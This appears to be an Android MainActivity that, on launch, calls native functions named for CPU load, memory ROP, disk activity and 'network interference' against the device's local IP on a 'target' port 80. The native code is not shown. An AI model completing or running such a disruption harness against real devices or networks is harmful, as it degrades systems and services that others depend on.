package com.example.myapp;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;

public class MainActivity extends AppCompatActivity {

    private NativeFunctions nativeFunctions;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        nativeFunctions = new NativeFunctions();

        // Exemplo de chamada para funções nativas
        nativeFunctions.intense();
        nativeFunctions.memoryRop();
        nativeFunctions.diskMain();

        // Obtém o IP local
        String localIp = getLocalIpAddress();
        if (localIp != null) {
            int port = 80; // Porta do servidor alvo
            nativeFunctions.networkInterference(localIp, port);
        } else {
            // Handle the case where local IP is not found
            System.out.println("Local IP address could not be determined.");
        }
    }

    // Método para obter o IP local
    private String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress.isSiteLocalAddress()) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }
}
